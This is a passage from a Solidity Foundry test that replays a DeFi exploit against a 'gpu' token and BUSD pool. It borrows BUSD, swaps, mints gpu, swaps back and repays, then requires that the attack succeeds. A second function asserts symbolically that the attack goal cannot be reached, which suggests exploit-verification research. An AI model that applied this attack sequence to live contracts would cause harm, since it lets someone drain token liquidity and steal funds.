        mint_gpu_attacker(gpu.balanceOf(address(attacker)));
        printBalance("After step2 ");
        swap_pair_attacker_gpu_busd(
            gpu.balanceOf(address(attacker)),
            (pair.getAmountOut(gpu.balanceOf(address(attacker)), address(gpu)) *
                9) / 10
        );
        printBalance("After step3 ");
        payback_busd_owner((22_600 ether * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_busd_owner(amt0);
        swap_pair_attacker_busd_gpu(amt1, amt2);
        mint_gpu_attacker(amt3);
        swap_pair_attacker_gpu_busd(amt4, amt5);
        payback_busd_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
